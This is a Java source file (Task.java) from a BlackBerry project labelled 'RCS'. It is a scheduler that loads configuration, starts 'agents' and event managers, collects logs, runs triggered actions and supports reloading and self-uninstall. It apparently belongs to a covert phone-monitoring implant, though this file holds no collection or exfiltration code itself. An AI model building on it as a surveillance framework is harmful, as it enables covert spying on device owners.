//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : Task.java
 * Created      : 26-mar-2010
 * *************************************************/

package blackberry;

import java.util.Timer;
import java.util.Vector;

import net.rim.device.api.system.DeviceInfo;
import blackberry.action.Action;
import blackberry.action.SubAction;
import blackberry.interfaces.Singleton;
import blackberry.log.LogCollector;
import blackberry.utils.Check;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;
import blackberry.utils.Utils;

// TODO: Auto-generated Javadoc
/**
 * The Class Task.
 */
public final class Task implements Singleton {

    private static final int SLEEPING_TIME = 1000;
    private static final long APP_TIMER_PERIOD = 1000;

    /** The debug instance. */
    //#ifdef DEBUG
    private static Debug debug = new Debug("Task", DebugLevel.VERBOSE);

    //#endif

    /**
     * Gets the single instance of Task.
     * 
     * @return single instance of Task
     */
    public static synchronized Task getInstance() {
        if (instance == null) {
            instance = new Task();
        }
        return instance;
    }

    /** The conf. */
    Conf conf;

    /** The status. */
    Status status;

    /** The device. */
    Device device;

    /** The log collector. */
    LogCollector logCollector;

    /** The event manager. */
    EventManager eventManager;

    /** The agent manager. */
    AgentManager agentManager;
    Timer applicationTimer;

    // ApplicationUpdateTask();

    AppUpdateManager appUpdateManager;

    private static Task instance;

    /**
     * Instantiates a new task.
     */
    private Task() {
        status = Status.getInstance();
        device = Device.getInstance();
        logCollector = LogCollector.getInstance();

        eventManager = EventManager.getInstance();
        agentManager = AgentManager.getInstance();

        //#ifdef DEBUG_TRACE
        debug.trace("Task created");

        //#endif
    }

    /**
     * Check actions.
     * 
     * @return true, if successful
     */
    public boolean checkActions() {
        Utils.sleep(1000);

        try{
        for (;;) {

            /*
             * if(Backlight.isEnabled()){
             * notifyBacklight(true);
             * }else{
             * notifyBacklight(false);
             * }
             */

            //#ifdef DEBUG_TRACE
            // debug.trace("checkActions");
            //#endif
            final int[] actionIds = status.getActionIdTriggered();

            final int asize = actionIds.length;
            if (asize > 0) {

                for (int k = 0; k < asize; ++k) {
                    final int actionId = actionIds[k];
                    final Action action = status.getAction(actionId);

                    if (action.isTriggered() == false) {
                        //#ifdef DEBUG
                        debug.warn("Should be triggered: " + action);
                        //#endif
                        continue;
                    }

                    //#ifdef DEBUG_TRACE
                    debug.trace("CheckActions() triggered: " + action);

                    //#endif
                    action.setTriggered(false, null);

                    final Vector subActions = action.getSubActionsList();

                    final int ssize = subActions.size();

                    for (int j = 0; j < ssize; ++j) {

                        try {
                            final SubAction subAction = (SubAction) subActions
                                    .elementAt(j);
                            //#ifdef DBC
                            Check.asserts(subAction != null,
                                    "checkActions: subAction!=null");
                            //#endift

                            final boolean ret = subAction.execute(action
                                    .getTriggeringEvent());

                            if (subAction.wantUninstall()) {
                                //#ifdef DEBUG
                                debug.warn("CheckActions() uninstalling");
                                //#endif
                                agentManager.stopAll();
                                eventManager.stopAll();
                                status.unTriggerAll();
                                return false;
                            }

                            if (subAction.wantReload()) {
                                //#ifdef DEBUG
                                debug.warn("CheckActions() reloading");
                                //#endif
                                agentManager.stopAll();
                                eventManager.stopAll();
                                Utils.sleep(2000);
                                status.unTriggerAll();
                                return true;
                            }
                            
                            if (ret == false) {
                                //#ifdef DEBUG
                                debug.warn("CheckActions() error executing: "
                                        + subAction);
                                //#endif
                                continue;
                            }
                        } catch (final Exception ex) {
                            //#ifdef DEBUG_ERROR
                            debug.error("checkActions for: " + ex);
                            //#endif
                        }
                    }
                }
            }
            Utils.sleep(SLEEPING_TIME);
        }
        }catch(Exception ex){
            //#ifdef DEBUG_FATAL
            debug.fatal("checkActions error, restart: " + ex);
            //#endif
            return true;
        }
    }

    /*
     * private boolean lastBacklight = false;
     * private synchronized void notifyBacklight(boolean backlight) {
     * if(backlight!=lastBacklight){
     * lastBacklight=backlight;
     * AppListener.getInstance().backlightStateChange(backlight);
     * }
     * }
     */

    /**
     * Start application timer.
     */
    synchronized void startApplicationTimer() {
        //#ifdef DEBUG_TRACE
        debug.trace("startApplicationTimer");
        //#endif

        if (applicationTimer != null) {
            applicationTimer.cancel();
            applicationTimer = null;
            appUpdateManager = null;
        }

        applicationTimer = new Timer();
        appUpdateManager = new AppUpdateManager();
        applicationTimer.schedule(appUpdateManager, APP_TIMER_PERIOD,
                APP_TIMER_PERIOD);
    }

    /**
     * Stop application timer.
     */
    synchronized void stopApplicationTimer() {
        //#ifdef DEBUG_TRACE
        debug.trace("stopApplicationTimer");
        //#endif
        if (applicationTimer != null) {
            applicationTimer.cancel();
            applicationTimer = null;
            appUpdateManager = null;
        }
    }

    /**
     * Task init.
     * 
     * @return true, if successful
     */
    public boolean taskInit() {
        //#ifdef DEBUG_TRACE
        debug.trace("TaskInit");
        //#endif

        agentManager.stopAll();
        eventManager.stopAll();

        if (device != null) {
            device.refreshData();
        }

        conf = new Conf();

        if (conf.load() == false) {
            //#ifdef DEBUG_TRACE
            debug.trace("Load Conf FAILED");
            //#endif

            return false;
        }

        if (logCollector != null) {
            logCollector.scanLogs();
        }

        // Da qui in poi inizia la concorrenza dei thread

        if (eventManager.startAll() == false) {
            //#ifdef DEBUG_TRACE
            debug.trace("eventManager FAILED");
            //#endif
            return false;
        }

        //#ifdef DEBUG_INFO
        debug.info("Events started");

        //#endif

        if (agentManager.startAll() == false) {
            //#ifdef DEBUG_TRACE
            debug.trace("agentManager FAILED");
            //#endif
            return false;
        }

        if (!DeviceInfo.isInHolster()) {
            //#ifdef DEBUG_TRACE
            debug.trace("going to start ApplicationTimer");
            //#endif
            startApplicationTimer();
        }

        //#ifdef DEBUG_INFO
        debug.info("Agents started");

        //#endif
        return true;
    }
}
